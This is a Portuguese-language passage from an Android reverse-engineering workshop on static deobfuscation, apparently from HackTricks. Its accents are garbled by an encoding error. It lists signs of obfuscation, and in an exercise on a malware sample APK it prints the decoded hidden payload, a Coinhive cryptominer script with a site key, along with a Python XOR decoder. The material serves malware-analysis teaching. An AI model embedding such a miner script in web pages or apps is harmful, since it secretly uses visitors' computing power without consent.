Existem muitas vezes em que o aplicativo que voc√™ est√° revertendo n√£o ser√° t√£o direto quanto alguns dos exemplos que discutimos. O desenvolvedor implementar√° uma ou mais t√©cnicas de ofusca√ß√£o para ocultar o comportamento e / ou implementa√ß√£o de seu aplicativo. Isso pode ser por motivos benignos e maliciosos.

A chave sobre a ofusca√ß√£o a lembrar √© que, se voc√™ quiser desofuscar, poder√° faz√™-lo. A decis√£o chave n√£o √© se voc√™ pode ou n√£o, mas se vale a pena os recursos para desofuscar.

A raz√£o pela qual voc√™ sempre pode desofuscar algo √© porque, em √∫ltima an√°lise, a CPU em algum momento precisa ver o c√≥digo n√£o ofuscado para execut√°-lo.

## Como desofuscar <a href="how-to-de-obfuscate" id="how-to-de-obfuscate"></a>

Como voc√™ escolhe desofuscar o aplicativo depender√° do m√©todo de ofusca√ß√£o, mas existem algumas t√©cnicas comuns que geralmente funcionam bem. Aqui, abordaremos apenas as t√©cnicas de desofusca√ß√£o est√°tica, pois este workshop cobre apenas an√°lise / revers√£o est√°tica. No entanto, lembre-se de que executar o aplicativo e analis√°-lo dinamicamente pode ser outra √≥tima maneira de contornar a ofusca√ß√£o.

Para ofusca√ß√£o no bytecode DEX (Java), uma das maneiras mais f√°ceis de desofuscar estaticamente √© identificar os m√©todos de desofusca√ß√£o no aplicativo e copiar sua decompila√ß√£o em um arquivo Java que voc√™ ent√£o executa no arquivo ofuscado, strings, c√≥digo, etc.

Outra solu√ß√£o para Java e C√≥digo Nativo √© transliterar o algoritmo de desofusca√ß√£o em Python ou qualquer outra linguagem de script com a qual voc√™ esteja mais confort√°vel. Digo "transliterar" porque √© importante lembrar que nem sempre √© necess√°rio \ * entender \ * o algoritmo de desofusca√ß√£o, voc√™ s√≥ precisa de uma maneira de execut√°-lo. Eu cubro isso com mais detalhes na palestra "Desembalando o Desembalador Embalado" que est√° vinculada na se√ß√£o "Mais exemplos".

## Indicadores de ofusca√ß√£o <a href="indicators-of-obfuscation" id="indicators-of-obfuscation"></a>

Existem muitos tipos diferentes de ofusca√ß√£o e, portanto, assim como muitos tipos diferentes de indicadores para alert√°-lo como analista de que um aplicativo provavelmente est√° ofuscado, mas aqui est√£o alguns exemplos com solu√ß√µes de an√°lise est√°tica propostas para desofuscar.

* Nenhuma string: Java e Android dependem muito de strings, ent√£o se voc√™ n√£o vir nenhuma ou apenas strings embaralhadas, √© altamente prov√°vel que as strings estejam ofuscadas.
  * Solu√ß√£o sugerida: Procure chamadas de m√©todo que levem strings como argumento e rastreie de volta de onde esse argumento est√° vindo. Em algum momento, o argumento de string passar√° por um m√©todo de desofusca√ß√£o antes de ser passado para a API que leva o argumento String.
* Strings embaralhadas: as APIs Java e Android exigem as strings de texto simples, n√£o embaralhadas.
  * Solu√ß√£o sugerida: As strings embaralhadas provavelmente s√£o todas passadas para os mesmos m√©todos antes de serem passadas para as APIs. Esses m√©todos provavelmente s√£o os m√©todos de desofusca√ß√£o.
* Arquivos bin√°rios no diret√≥rio assets / e chamadas DexClassLoader no aplicativo: provavelmente descompactando e carregando c√≥digo adicional. (Tamb√©m pode estar baixando de um local remoto e depois carregando usando DexClassLoader)
  * Solu√ß√£o sugerida: Identifique onde o arquivo √© lido e siga o caminho. √â prov√°vel que seja desofuscado rapidamente ap√≥s a leitura.
* Bibliotecas nativas - N√£o √© poss√≠vel identificar as fun√ß√µes JNI (nenhuma fun√ß√£o chamada Java_ e nenhuma chamada para RegisterNatives): Para executar quaisquer m√©todos nativos, JNI deve ser capaz de emparelhar a fun√ß√£o na biblioteca nativa com a declara√ß√£o do m√©todo nativo em Java e, portanto, um dos dois deve existir em algum momento.
  * Solu√ß√£o sugerida: Comece no m√©todo JNI_OnLoad e procure uma rotina de desofusca√ß√£o que carregue c√≥digo adicional.

## Exerc√≠cio 7 - Desofusca√ß√£o de string <a href="exercise-7---string-deobfuscation" id="exercise-7---string-deobfuscation"></a>

Neste exerc√≠cio, praticaremos a desofusca√ß√£o de strings para analisar um aplicativo. Para o exerc√≠cio, usaremos a amostra em `~/samples/ClashOfLights.apk` na VM. Esta amostra tem o digest SHA256 c403d2dcee37f80b6d51ebada18c409a9eae45416fe84cd0c1ea1d9897eae4e5.

### Objetivos <a href="goals" id="goals"></a>

Identificar strings ofuscadas e desenvolver uma solu√ß√£o para desofusc√°-las.

### Contexto do exerc√≠cio <a href="exercise-context" id="exercise-context"></a>

Voc√™ √© um analista de malware revisando este aplicativo para determinar se √© malware. Voc√™ encontra uma string Javascript ofuscada que est√° sendo carregada e precisa desofusc√°-la para determinar se o aplicativo √© malicioso ou n√£o. Voc√™ n√£o pode executar o aplicativo dinamicamente e precisa determinar o que o Javascript √© estaticamente.

### Instru√ß√µes <a href="instructions" id="instructions"></a>

1. Encontre a string que voc√™ precisa desofuscar
2. Identifique a rotina que desofusca isso.
3. Determine como voc√™ deseja escrever uma solu√ß√£o para desofuscar a string.
4. Fa√ßa isso :)

### Solu√ß√£o <a href="solution" id="solution"></a>

A string desofuscada √©:
```
<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
```
O script Python que escrevi para desofuscar √©:
```
enc_str = "773032205849207A3831326F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B53163735222D393B475C7A37222D7F38421B6A66643032205849206477303220584920643D2223725C503A3F39636C725F5C237A082C383C7950223F65023F3D5F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B101F42700D1F39331717161574213F2B2337505D27606B712C7B0A543D342E317F214558262E636A6A6E1E4A37282233256C"

length = len(enc_str)
count = 0
dec_str = [0] * (length/2)
while (count < length):
    dec_str[count/2] = (int(enc_str[count], 16) << 4) + int(enc_str[count + 1], 16) & 0xFF
    count += 2
print dec_str


key = [75, 67, 81, 82, 49, 57, 84, 90]
enc_str = dec_str
count = 0
length = len(enc_str)
while (count < length):
    dec_str[count] = chr(enc_str[count] ^ key[count % len(key)])
    count += 1
print ''.join(dec_str)
```
## Mais Exemplos <a href="more-examples" id="more-examples"></a>

Eu fiz algumas palestras sobre desofusca√ß√£o de aplicativos Android que incluem uma variedade de mecanismos de ofusca√ß√£o. Nestas palestras, eu discuto as t√©cnicas avan√ßadas de ofusca√ß√£o, minha solu√ß√£o para desofuscar e as considera√ß√µes e escolhas que fiz ao decidir como eu queria desofuscar.

* BlackHat USA 2018: ‚ÄúDesempacotando o Desempacotador: Engenharia Reversa de uma Biblioteca Anti-An√°lise Android‚Äù \[[v√≠deo](https://www.youtube.com/watch?v=s0Tqi7fuOSU)]
  * Esta palestra aborda a engenharia reversa de uma das bibliotecas nativas de anti-an√°lise mais complexas que eu j√° vi usada por um aplicativo Android. Ela cobre principalmente t√©cnicas de ofusca√ß√£o em c√≥digo nativo.
* REcon 2019: ‚ÄúO Caminho para a Carga √ötil: Edi√ß√£o Android‚Äù \[[v√≠deo](https://recon.cx/media-archive/2019/Session.005.Maddie_Stone.The_path_to_the_payload_Android_Edition-J3ZnNl2GYjEfa.mp4)]
  * Esta palestra discute uma s√©rie de t√©cnicas de ofusca√ß√£o, exclusivamente em c√≥digo Java, que um botnet Android estava usando para ocultar seu comportamento.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
